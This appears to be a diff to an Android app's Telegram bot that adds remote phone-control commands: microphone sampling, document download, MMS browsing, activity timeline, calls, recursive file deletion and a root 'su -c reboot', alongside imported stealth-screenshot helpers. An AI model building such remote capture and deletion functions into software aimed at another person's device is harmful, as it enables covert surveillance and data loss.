@@ -10,6 +10,9 @@ import android.hardware.camera2.CameraMetadata
 import android.hardware.camera2.CaptureRequest
 import android.graphics.ImageFormat
 import android.media.ImageReader
+import android.graphics.Bitmap
+import android.media.AudioFormat
+import android.media.AudioRecord
 import android.media.MediaRecorder
 import android.os.Build
 import android.os.Handler
@@ -55,6 +58,13 @@ import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
 import com.ismartcoding.plain.helpers.StealthScreenshotHelper
 import com.ismartcoding.plain.helpers.UtilitiesHelper
 import com.ismartcoding.plain.helpers.WifiControlHelper
+import com.ismartcoding.plain.helpers.FileHashHelper
+import com.ismartcoding.plain.helpers.QrCodeGenerateHelper
+import com.ismartcoding.plain.helpers.RootHelper
+import com.ismartcoding.plain.helpers.SoundMeterHelper
+import com.ismartcoding.plain.features.contact.GroupHelper
+import com.ismartcoding.plain.features.media.DocsHelper
+import com.ismartcoding.plain.services.TimelineHelper
 import com.ismartcoding.plain.events.HttpApiEvents
 import com.ismartcoding.lib.channel.sendEvent
 import com.ismartcoding.plain.preferences.PomodoroSettingsPreference
@@ -188,6 +198,18 @@ object TelegramBotManager {
         "deletecontact" to "🗑 Delete a contact by name or number",
         "editnote" to "✏️ Edit an existing note — interactive",
         "forwardclipboard" to "📋 Auto-forward clipboard changes to chat — /forwardclipboard [on|off]",
+        "soundmeter" to "🎙 Ambient sound level — /soundmeter [seconds]",
+        "qrcode" to "📷 Generate QR code image — /qrcode <text or URL>",
+        "docs" to "📄 Document library (PDF, DOCX, etc.) — /docs [search]",
+        "filehash" to "#️⃣ File hash (SHA-256 + MD5) — /filehash <path>",
+        "wifiscan" to "📡 Scan nearby Wi-Fi networks",
+        "timeline" to "📋 Device activity timeline — /timeline [n]",
+        "contactgroups" to "👥 Contact groups — list and view members",
+        "callnow" to "📞 Initiate outgoing call — /callnow <number>",
+        "deletefile" to "🗑 Delete a file from device — /deletefile <path>",
+        "networkinfo" to "🌐 Extended network & Wi-Fi details",
+        "reboot" to "🔄 Reboot device (requires root or Device Admin)",
+        "mms" to "💬 Browse MMS multimedia messages — /mms [n]",
         "commands" to "📝 List all commands with details",
         "stop" to "⛔ Stop the bot",
     )
@@ -475,7 +497,7 @@ object TelegramBotManager {
                     "brightness", "bright" -> cmdBrightness(args)
                     "volume", "vol" -> cmdVolume(args)
                     "launch", "open" -> cmdLaunch(args)
-                    "datasettings", "data", "mobiledata" -> cmdDataSettings()
+                    "datasettings" -> cmdDataSettings()
                     "bedtime" -> cmdBedtime(args)
                     "launches", "launchhistory" -> cmdLaunches(args)
                     "livecall", "calltracker" -> cmdLiveCall()
@@ -503,6 +525,18 @@ object TelegramBotManager {
                     "deletecontact", "delcontact", "rmcontact" -> cmdDeleteContact(args)
                     "editnote" -> cmdEditNote(args)
                     "forwardclipboard", "clipfwd", "clipmon" -> cmdForwardClipboard(args)
+                    "soundmeter", "sound", "noise", "dblevel" -> cmdSoundMeter(args)
+                    "qrcode", "qr" -> cmdQrCode(text.removePrefix(parts[0]).trim())
+                    "docs", "documents", "document" -> cmdDocs(args)
+                    "filehash", "hash", "sha256" -> cmdFileHash(args)
+                    "wifiscan", "wifilist", "scanwifi" -> cmdWifiScan()
+                    "timeline", "activity" -> cmdTimeline(args)
+                    "contactgroups", "groups", "cgroups" -> cmdContactGroups()
+                    "callnow", "dial", "makecall" -> cmdCallNow(args)
+                    "deletefile", "delfile", "rmfile" -> cmdDeleteFile(args)
+                    "networkinfo", "netinfo", "wifiinfo" -> cmdNetworkInfo()
+                    "reboot", "restart", "rebootdevice" -> cmdReboot()
+                    "mms" -> cmdMms(args)
                     "commands" -> cmdCommands()
                     "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                     else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
@@ -1640,6 +1674,85 @@ object TelegramBotManager {
                     "con_del_no" -> {
                         TelegramApiClient.answerCallbackQuery(token, cqId)
                         if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Deletion cancelled.")
+                    }
+                    // ---- Contact groups ----
+                    "cg_view" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading members…")
+                        renderContactGroupMembers(rest, editMessageId = messageId)
+                    }
+                    "cg_back" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        cmdContactGroups()
+                    }
+                    // ---- Delete file ----
+                    "df_yes" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Deleting…")
+                        val path = pathFromToken(rest)
+                        if (path == null) {
+                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "❌ Invalid path token.")
+                        } else {
+                            val f = File(path)
+                            val deleted = f.exists() && (if (f.isDirectory) f.deleteRecursively() else f.delete())
+                            val msg = if (deleted) "✅ Deleted: <code>${htmlEsc(f.name)}</code>" else "❌ Could not delete <code>${htmlEsc(f.name)}</code>. Check permissions."
+                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, msg)
+                            else sendMessage(msg)
+                        }
+                    }
+                    "df_no" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Delete cancelled.")
+                    }
+                    // ---- Docs ----
+                    "doc_get" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending document…")
+                        val path = pathFromToken(rest)
+                        if (path == null) { sendMessage("❌ Invalid token.") } else {
+                            val f = File(path)
+                            if (!f.exists()) { sendMessage("❌ File not found.") }
+                            else if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large (${humanSize(f.length())}).") }
+                            else { sendUploadDocument(); TelegramApiClient.sendDocument(token, chatId, f, "📄 ${htmlEsc(f.name)}") }
+                        }
+                    }
+                    "doc_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val sep = rest.lastIndexOf(':')
+                        val q = if (sep < 0) "" else rest.substring(0, sep).let { if (it == "_") "" else it }
+                        val off = if (sep < 0) rest.toIntOrNull() ?: 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
+                        renderDocsPage(q, off, editMessageId = messageId)
+                    }
+                    // ---- Reboot ----
+                    "reboot_yes" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Rebooting…")
+                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔄 Rebooting via root…")
+                        try {
+                            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
+                            p.waitFor()
+                        } catch (e: Exception) {
+                            sendMessage("❌ Reboot failed: ${htmlEsc(e.message ?: "")}")
+                        }
+                    }
+                    "reboot_adm" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId, "Rebooting…")
+                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔄 Rebooting via Device Admin…")
+                        try {
+                            val ctx = MainApp.instance
+                            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                            val admin = android.content.ComponentName(ctx, com.ismartcoding.plain.receivers.PlainDeviceAdminReceiver::class.java)
+                            val m = dpm.javaClass.getMethod("reboot", android.content.ComponentName::class.java)
+                            m.invoke(dpm, admin)
+                        } catch (e: Exception) {
+                            sendMessage("❌ Reboot failed: ${htmlEsc(e.message ?: "")}")
+                        }
+                    }
+                    "reboot_no" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Reboot cancelled.")
+                    }
+                    // ---- MMS paging ----
+                    "mms_pg" -> {
+                        TelegramApiClient.answerCallbackQuery(token, cqId)
+                        val off = rest.toIntOrNull() ?: 0
+                        renderMmsPage(off, editMessageId = messageId)
                     }
                     else -> TelegramApiClient.answerCallbackQuery(token, cqId)
                 }
@@ -6176,4 +6289,523 @@ object TelegramBotManager {
     // photofwd_on / photofwd_off -> cmdForwardPhotos(listOf("on"/"off"))
     // clipfwd_on / clipfwd_off -> cmdForwardClipboard(listOf("on"/"off"))
     // smsfwd_on / smsfwd_off -> forwardSmsEnabled = true/false (already handled above)
+
+    // ==================== /soundmeter ====================
+
+    @SuppressLint("MissingPermission")
+    private suspend fun cmdSoundMeter(args: List<String>) {
+        val seconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 10) ?: 3
+        sendMessage("🎙 Measuring ambient sound for <b>${seconds}s</b>…")
+        sendTyping()
+        withContext(Dispatchers.IO) {
+            try {
+                val sampleRate = 44100
+                val bufSize = AudioRecord.getMinBufferSize(
+                    sampleRate,
+                    AudioFormat.CHANNEL_IN_MONO,
+                    AudioFormat.ENCODING_PCM_16BIT
+                ).let { if (it <= 0) 4096 else it }
+                val recorder = AudioRecord(
+                    MediaRecorder.AudioSource.MIC,
+                    sampleRate,
+                    AudioFormat.CHANNEL_IN_MONO,
+                    AudioFormat.ENCODING_PCM_16BIT,
+                    bufSize * 4
+                )
+                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
+                    sendMessage("❌ Could not initialize AudioRecord. Ensure Microphone permission is granted.")
+                    return@withContext
+                }
+                recorder.startRecording()
+                val buffer = ShortArray(bufSize)
+                val readings = mutableListOf<Float>()
+                val endTime = System.currentTimeMillis() + seconds * 1000L
+                while (System.currentTimeMillis() < endTime) {
+                    val read = recorder.read(buffer, 0, buffer.size)
+                    if (read > 0) {
+                        val amp = SoundMeterHelper.getMaxAmplitude(buffer, read)
+                        if (amp > 1.0) {
+                            val db = SoundMeterHelper.amplitudeToDecibel(amp)
+                            if (db > 0f && db < 200f) readings.add(db)
+                        }
+                    }
+                }
+                recorder.stop()
+                recorder.release()
+                if (readings.isEmpty()) {
+                    sendMessage("🎙 <b>Sound Level</b>\n\n⚠️ No audio captured. Check Microphone permission and ensure sound is present.")
+                    return@withContext
+                }
+                val avg = readings.average().toFloat()
+                val max = readings.max()
+                val min = readings.min()
+                val filled = ((avg / 10).toInt()).coerceIn(0, 10)
+                val bar = "█".repeat(filled) + "░".repeat(10 - filled)
+                val level = when {
+                    avg < 30 -> "🤫 Very quiet (library)"
+                    avg < 50 -> "🗣 Moderate (conversation)"
+                    avg < 70 -> "📢 Loud (busy street)"
+                    avg < 90 -> "🔊 Very loud (concert)"
+                    else -> "🚨 Extremely loud!"
+                }
+                sendMessage(
+                    "🎙 <b>Ambient Sound Level</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
+                    "Duration: ${seconds}s · ${readings.size} samples\n\n" +
+                    "[$bar] <b>${String.format("%.1f", avg)} dB</b>\n" +
+                    "🔺 Peak: <b>${String.format("%.1f", max)} dB</b>\n" +
+                    "🔻 Min: <b>${String.format("%.1f", min)} dB</b>\n\n" +
+                    level
+                )
+            } catch (e: Exception) {
+                sendMessage("❌ Sound meter error: ${htmlEsc(e.message ?: "")}\n<i>Ensure Microphone permission is granted.</i>")
+            }
+        }
+    }
+
+    // ==================== /qrcode ====================
+
+    private suspend fun cmdQrCode(content: String) {
+        if (content.isBlank()) {
+            sendMessage("📷 <b>QR Code Generator</b>\n\nUsage: <code>/qrcode &lt;text or URL&gt;</code>\n\nExamples:\n<code>/qrcode https://plainapp.co</code>\n<code>/qrcode Hello World</code>")
+            return
+        }
+        sendTyping()
+        try {
+            val size = 512
+            val bitmap = QrCodeGenerateHelper.generate(content.trim(), size, size)
+            val file = File(MainApp.instance.cacheDir, "tg_qr_${System.currentTimeMillis()}.jpg")
+            java.io.FileOutputStream(file).use { out ->
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 95, out)
+            }
+            sendUploadPhoto()
+            TelegramApiClient.sendPhoto(token, chatId, file, "📷 QR: ${htmlEsc(content.take(80))}")
+            file.delete()
+        } catch (e: Exception) {
+            sendMessage("❌ QR code error: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    // ==================== /docs ====================
+
+    private suspend fun cmdDocs(args: List<String>) {
+        sendTyping()
+        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
+        renderDocsPage(q, 0, editMessageId = null)
+    }
+
+    private suspend fun renderDocsPage(query: String, offset: Int, editMessageId: Long?) {
+        try {
+            val pageSize = 10
+            val items = DocsHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
+            val hasMore = items.size > pageSize
+            val pageItems = items.take(pageSize)
+            if (pageItems.isEmpty()) {
+                val msg = if (offset == 0) "📄 No documents found${if (query.isNotBlank()) " matching <i>${htmlEsc(query.removePrefix("text:"))}</i>" else ""}." else "📄 No more documents."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("📄 <b>Documents</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap to download.</i>\n\n")
+            val rows = mutableListOf<List<Pair<String, String>>>()
+            pageItems.forEachIndexed { i, doc ->
+                val ext = doc.path.substringAfterLast('.').uppercase().take(6)
+                sb.append("${offset + i + 1}. 📄 <b>${htmlEsc(doc.title.take(55))}</b>\n")
+                sb.append("   [$ext] · ${humanSize(doc.size)} · ${fmtTime(doc.createdAt.toEpochMilliseconds())}\n\n")
+                rows.add(listOf("📥 ${offset + i + 1}. ${doc.title.take(28)}" to "doc_get:${pathToken(doc.path)}"))
+            }
+            val qSeg = safeSeg(query.ifBlank { "_" })
+            val nav = mutableListOf<Pair<String, String>>()
+            if (offset > 0) nav.add("◀️ Prev" to "doc_pg:$qSeg:${(offset - pageSize).coerceAtLeast(0)}")
+            if (hasMore) nav.add("Next ▶️" to "doc_pg:$qSeg:${offset + pageSize}")
+            if (nav.isNotEmpty()) rows.add(nav)
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            sendMessage("❌ Could not load documents: ${htmlEsc(e.message ?: "")}")
+        }
+    }
+
+    // ==================== /filehash ====================
+
+    private suspend fun cmdFileHash(args: List<String>) {
+        if (args.isEmpty()) {
+            sendMessage("#️⃣ <b>File Hash</b>\n\nUsage: <code>/filehash &lt;path&gt;</code>\n\nExample:\n<code>/filehash /sdcard/DCIM/photo.jpg</code>")
+            return
+        }
+        val path = args.joinToString(" ").trim()
+        sendMessage("⏳ Hashing <code>${htmlEsc(path)}</code>…")
+        withContext(Dispatchers.IO) {
+            val f = File(path)
+            if (!f.exists() || !f.isFile) {
+                sendMessage("❌ File not found: <code>${htmlEsc(path)}</code>"); return@withContext
+            }
+            if (f.length() > 500 * 1024 * 1024L) {
+                sendMessage("❌ File too large (>500 MB) — hashing skipped."); return@withContext
+            }
+            try {
+                val sha256 = FileHashHelper.strongHash(f)
+                val md5Weak = FileHashHelper.weakHash(f)
+                sendMessage(
+                    "#️⃣ <b>File Hash</b>\n" +
+                    "📄 <code>${htmlEsc(f.name)}</code>\n" +
+                    "📦 Size: ${humanSize(f.length())}\n" +
+                    "📂 Path: <code>${htmlEsc(path)}</code>\n\n" +
+                    "🔐 <b>SHA-256:</b>\n<code>$sha256</code>\n\n" +
+                    "🔑 <b>MD5/Weak:</b>\n<code>$md5Weak</code>"
+                )
+            } catch (e: Exception) {
+                sendMessage("❌ Hashing failed: ${htmlEsc(e.message ?: "")}")
+            }
+        }
+    }
+
+    // ==================== /wifiscan ====================
+
+    @SuppressLint("MissingPermission")
+    private suspend fun cmdWifiScan() {
+        sendTyping()
+        val ctx = MainApp.instance
+        @Suppress("DEPRECATION")
+        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
+        if (wm == null) { sendMessage("❌ Wi-Fi service unavailable."); return }
+        sendMessage("📡 Scanning for Wi-Fi networks…")
+        withContext(Dispatchers.IO) {
+            try {
+                @Suppress("DEPRECATION")
+                wm.startScan()
+                delay(2800L)
+                @Suppress("DEPRECATION")
+                val results = wm.scanResults
+                if (results.isNullOrEmpty()) {
+                    sendMessage("📡 No networks found.\n<i>Ensure Wi-Fi is enabled and Location permission is granted.</i>")
+                    return@withContext
+                }
+                val sorted = results.sortedByDescending { it.level }
+                val sb = StringBuilder("📡 <b>Nearby Wi-Fi Networks</b> (${sorted.size})\n━━━━━━━━━━━━━━━━━━━━\n\n")
+                sorted.take(20).forEachIndexed { i, r ->
+                    @Suppress("DEPRECATION")
+                    val ssid = if (r.SSID.isNullOrBlank()) "(hidden)" else r.SSID
+                    val bars = when {
+                        r.level >= -55 -> "▂▄▆█"
+                        r.level >= -70 -> "▂▄▆░"
+                        r.level >= -80 -> "▂▄░░"
+                        else -> "▂░░░"
+                    }
+                    val freq = if (r.frequency > 4000) "5GHz" else "2.4GHz"
+                    val lock = if (r.capabilities.contains("WPA") || r.capabilities.contains("WEP")) "🔒" else "🔓"
+                    sb.append("${i + 1}. $lock $bars <b>${htmlEsc(ssid)}</b>  ${r.level} dBm\n")
+                    sb.append("   $freq · <code>${r.BSSID ?: ""}</code>\n\n")
+                    if (sb.length > 3600) { sb.append("…"); return@forEachIndexed }
+                }
+                sendMessage(sb.toString())
+            } catch (e: Exception) {
+                sendMessage("❌ Wi-Fi scan error: ${htmlEsc(e.message ?: "")}")
+            }
+        }
+    }
+
+    // ==================== /timeline ====================
+
+    private fun cmdTimeline(args: List<String>) {
+        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 200) ?: 50
+        val all = TimelineHelper.all(n)
+        val entries = all.takeLast(n).reversed()
+        if (entries.isEmpty()) {
+            sendMessage("📋 <b>Device Timeline</b>\n\n<i>No activity recorded yet. Events are captured by PlainApp's background service.</i>")
+            return
+        }
+        val sb = StringBuilder("📋 <b>Device Timeline</b> (last ${entries.size})\n━━━━━━━━━━━━━━━━━━━━\n\n")
+        entries.forEach { e ->
+            val icon = when (e.type) {
+                "app_launch" -> "🚀"
+                "call" -> "📞"
+                "sms" -> "💬"
+                "notif" -> "🔔"
+                "screenshot" -> "📸"
+                "location" -> "📍"
+                "music" -> "🎵"
+                else -> "•"
+            }
+            sb.append("$icon <b>${htmlEsc(e.title.take(60))}</b>\n")
+            if (e.subtitle.isNotBlank()) sb.append("   <i>${htmlEsc(e.subtitle.take(80))}</i>\n")
+            if (e.appName.isNotBlank()) sb.append("   📱 ${htmlEsc(e.appName.take(40))}\n")
+            sb.append("   🕐 ${fmtTime(e.time)}\n\n")
+            if (sb.length > 3800) { sb.append("… (truncated — use /timeline <n> for fewer entries)"); return@forEach }
+        }
+        sendMessage(sb.toString())
+    }
+
+    // ==================== /contactgroups ====================
+
+    private suspend fun cmdContactGroups() {
+        sendTyping()
+        val groups = try { GroupHelper.getAll() } catch (e: Exception) {
+            sendMessage("❌ Could not read contact groups: ${htmlEsc(e.message ?: "")}"); return
+        }
+        if (groups.isEmpty()) {
+            sendMessage("👥 <b>Contact Groups</b>\n\n<i>No contact groups found on this device.</i>")
+            return
+        }
+        val sb = StringBuilder("👥 <b>Contact Groups</b> (${groups.size})\n━━━━━━━━━━━━━━━━━━━━\n<i>Tap a group to view its members.</i>\n\n")
+        val rows = mutableListOf<List<Pair<String, String>>>()
+        groups.take(20).forEachIndexed { i, g ->
+            sb.append("${i + 1}. 👥 <b>${htmlEsc(g.name)}</b>  <code>${g.id}</code>\n")
+            rows.add(listOf("${i + 1}. ${g.name.take(34)}" to "cg_view:${g.id}"))
+        }
+        if (groups.size > 20) sb.append("\n<i>… and ${groups.size - 20} more groups (only first 20 shown)</i>")
+        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
+    }
+
+    private suspend fun renderContactGroupMembers(groupId: String, editMessageId: Long?) {
+        try {
+            val ctx = MainApp.instance
+            val memberContactIds = mutableSetOf<String>()
+            val uri = android.provider.ContactsContract.Data.CONTENT_URI
+            val projection = arrayOf(android.provider.ContactsContract.CommonDataKinds.GroupMembership.CONTACT_ID)
+            val sel = "${android.provider.ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID} = ? AND ${android.provider.ContactsContract.Data.MIMETYPE} = ?"
+            val selArgs = arrayOf(groupId, android.provider.ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE)
+            ctx.contentResolver.query(uri, projection, sel, selArgs, null)?.use { cur ->
+                while (cur.moveToNext()) memberContactIds.add(cur.getString(0))
+            }
+            val groupName = try { GroupHelper.getAll().firstOrNull { it.id.toString() == groupId }?.name ?: "Group" } catch (_: Throwable) { "Group" }
+            if (memberContactIds.isEmpty()) {
+                val msg = "👥 <b>${htmlEsc(groupName)}</b>\n\n<i>This group has no members.</i>"
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("👥 <b>${htmlEsc(groupName)}</b> (${memberContactIds.size} members)\n━━━━━━━━━━━━━━━━━━━━\n\n")
+            memberContactIds.take(30).forEach { cid ->
+                val contact = try { ContactMediaStoreHelper.getByIdAsync(ctx, cid) } catch (_: Throwable) { null }
+                if (contact != null) {
+                    val name = contactDisplayName(contact)
+                    val phone = contact.phoneNumbers.firstOrNull()?.value ?: ""
+                    sb.append("👤 <b>${htmlEsc(name)}</b>${if (phone.isNotBlank()) "  <code>${htmlEsc(phone)}</code>" else ""}\n")
+                } else {
+                    sb.append("👤 <i>Contact #${cid}</i>\n")
+                }
+            }
+            if (memberContactIds.size > 30) sb.append("\n<i>… and ${memberContactIds.size - 30} more members</i>")
+            val rows = listOf(listOf("⬅️ Back to groups" to "cg_back"))
+            val markup = TelegramApiClient.inlineKeyboard(rows)
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
+            else sendMessage(sb.toString(), replyMarkup = markup)
+        } catch (e: Exception) {
+            val msg = "❌ Could not load group members: ${htmlEsc(e.message ?: "")}"
+            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+        }
+    }
+
+    // ==================== /callnow ====================
+
+    private fun cmdCallNow(args: List<String>) {
+        if (args.isEmpty()) {
+            sendMessage("📞 <b>Make a Call</b>\n\nUsage: <code>/callnow &lt;number&gt;</code>\n\nExample: <code>/callnow +15551234567</code>\n\n<i>Requires CALL_PHONE permission.</i>")
+            return
+        }
+        val raw = args.joinToString("").trim()
+        val number = raw.filter { it.isDigit() || it == '+' || it == '#' || it == '*' }
+        if (number.isBlank()) { sendMessage("❌ Invalid number: <code>${htmlEsc(raw)}</code>"); return }
+        try {
+            val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number"))
+                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            MainApp.instance.startActivity(intent)
+            sendMessage("📞 Dialing <code>${htmlEsc(number)}</code> on the device…\n\nUse /livecall to manage the call.")
+        } catch (e: Exception) {
+            sendMessage("❌ Could not initiate call: ${htmlEsc(e.message ?: "")}\n<i>Ensure CALL_PHONE permission is granted and the number is valid.</i>")
+        }
+    }
+
+    // ==================== /deletefile ====================
+
+    private suspend fun cmdDeleteFile(args: List<String>) {
+        if (args.isEmpty()) {
+            sendMessage("🗑 <b>Delete File</b>\n\nUsage: <code>/deletefile &lt;path&gt;</code>\n\nExample:\n<code>/deletefile /sdcard/Download/old.apk</code>\n\n⚠️ Deletion is <b>permanent</b> and cannot be undone.")
+            return
+        }
+        val path = args.joinToString(" ").trim()
+        val f = File(path)
+        if (!f.exists()) { sendMessage("❌ File not found: <code>${htmlEsc(path)}</code>"); return }
+        val typeStr = if (f.isDirectory) "📁 Directory" else "📄 File"
+        val sizeStr = if (f.isFile) " · ${humanSize(f.length())}" else ""
+        val tok = pathToken(path)
+        val sb = "$typeStr: <b>${htmlEsc(f.name)}</b>$sizeStr\n<code>${htmlEsc(path)}</code>\n\n⚠️ <b>This cannot be undone.</b> Confirm?"
+        val markup = TelegramApiClient.inlineKeyboard(listOf(
+            listOf("✅ Yes, delete" to "df_yes:$tok", "❌ Cancel" to "df_no:")
+        ))
+        sendMessage("🗑 <b>Delete File</b>\n\n$sb", replyMarkup = markup)
+    }
+
+    // ==================== /networkinfo ====================
+
+    @SuppressLint("MissingPermission")
+    private suspend fun cmdNetworkInfo() {
+        sendTyping()
+        val ctx = MainApp.instance
+        @Suppress("DEPRECATION")
+        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
+        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
+        val sb = StringBuilder("🌐 <b>Network Information</b>\n━━━━━━━━━━━━━━━━━━━━\n\n")
+        try {
+            val active = cm?.activeNetwork
+            val nc = cm?.getNetworkCapabilities(active)
+            val lp = cm?.getLinkProperties(active)
+            val netType = when {
+                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "📶 Wi-Fi"
+                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "📡 Cellular"
+                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "🔌 Ethernet"
+                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true -> "🔐 VPN"
+                else -> "❓ None / Unknown"
+            }
+            sb.append("🔌 <b>Active:</b> $netType\n")
+            val ips = lp?.linkAddresses?.joinToString(", ") { "${it.address.hostAddress}/${it.prefixLength}" }
+            if (!ips.isNullOrBlank()) sb.append("🌐 <b>IPs:</b> <code>$ips</code>\n")
+            val dns = lp?.dnsServers?.joinToString(", ") { it.hostAddress ?: "" }
+            if (!dns.isNullOrBlank()) sb.append("🔍 <b>DNS:</b> <code>$dns</code>\n")
+            val gateway = lp?.routes?.firstOrNull { it.isDefaultRoute }?.gateway?.hostAddress
+            if (!gateway.isNullOrBlank()) sb.append("🚪 <b>Gateway:</b> <code>$gateway</code>\n")
+            val iface = lp?.interfaceName
+            if (!iface.isNullOrBlank()) sb.append("🔌 <b>Interface:</b> <code>$iface</code>\n")
+            val down = nc?.linkDownstreamBandwidthKbps
+            val up = nc?.linkUpstreamBandwidthKbps
+            if (down != null && up != null) sb.append("⬇️ ${down / 1000} Mbps  ⬆️ ${up / 1000} Mbps\n")
+            if (nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true && wm != null) {
+                sb.append("\n📶 <b>Wi-Fi Details</b>\n")
+                @Suppress("DEPRECATION")
+                val info = wm.connectionInfo
+                if (info != null) {
+                    @Suppress("DEPRECATION")
+                    val ssid = info.ssid?.removePrefix("\"")?.removeSuffix("\"") ?: "unknown"
+                    sb.append("   SSID: <b>${htmlEsc(ssid)}</b>\n")
+                    sb.append("   BSSID: <code>${info.bssid ?: "unknown"}</code>\n")
+                    sb.append("   Signal: ${info.rssi} dBm\n")
+                    sb.append("   Link speed: <b>${info.linkSpeed} Mbps</b>\n")
+                    sb.append("   Frequency: ${info.frequency} MHz (${if (info.frequency > 4000) "5 GHz" else "2.4 GHz"})\n")
+                    val ip = android.text.format.Formatter.formatIpAddress(info.ipAddress)
+                    sb.append("   IP: <code>$ip</code>\n")
+                }
+            }
+        } catch (e: Exception) {
+            sb.append("Error reading network info: ${htmlEsc(e.message ?: "")}\n")
+        }
+        sb.append("\n🕐 $ts")
+        sendMessage(sb.toString())
+    }
+
+    // ==================== /reboot ====================
+
+    private suspend fun cmdReboot() {
+        sendTyping()
+        val isRooted = RootHelper.isRooted()
+        val isAdmin = DeviceAdminGuard.isAdminActive(MainApp.instance)
+        if (!isRooted && !isAdmin) {
+            sendMessage("❌ <b>Reboot not available</b>\n\nReboot requires either:\n• Root access (Magisk / KernelSU / APatch), or\n• Device Admin privilege (Android 7+)\n\nNeither is active on this device.")
+            return
+        }
+        val via = when {
+            isRooted -> "root shell"
+            else -> "Device Admin (Android 7+)"
+        }
+        val key = if (isRooted) "reboot_yes" else "reboot_adm"
+        sendMessage(
+            "🔄 <b>Reboot Device</b>\n\nMethod: <b>$via</b>\n\n⚠️ The device will restart immediately. The bot will reconnect automatically after reboot.",
+            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("✅ Yes, reboot now" to key, "❌ Cancel" to "reboot_no")
+            ))
+        )
+    }
+
+    // ==================== /mms ====================
+
+    private suspend fun cmdMms(args: List<String>) {
+        sendTyping()
+        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 10
+        renderMmsPage(offset = 0, editMessageId = null, pageSize = n)
+    }
+
+    private suspend fun renderMmsPage(offset: Int, editMessageId: Long?, pageSize: Int = 10) {
+        try {
+            val ctx = MainApp.instance
+            val uri = android.net.Uri.parse("content://mms")
+            val projection = arrayOf("_id", "date", "sub", "read", "msg_box")
+            val cursor = ctx.contentResolver.query(
+                uri, projection, null, null, "date DESC"
+            ) ?: run {
+                val msg = "❌ Could not access MMS inbox. Check SMS permission."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val total = cursor.count
+            if (total == 0) {
+                cursor.close()
+                val msg = "💬 No MMS messages found."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            if (!cursor.move(offset + 1)) {
+                cursor.close()
+                val msg = "💬 No more MMS messages."
+                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
+                return
+            }
+            val sb = StringBuilder("💬 <b>MMS Messages</b> · ${offset + 1}–${min(offset + pageSize, total)} of $total\n━━━━━━━━━━━━━━━━━━━━\n\n")
+            var count = 0
+            do {
+                val id = cursor.getString(cursor.getColumnIndexOrThrow("_id"))
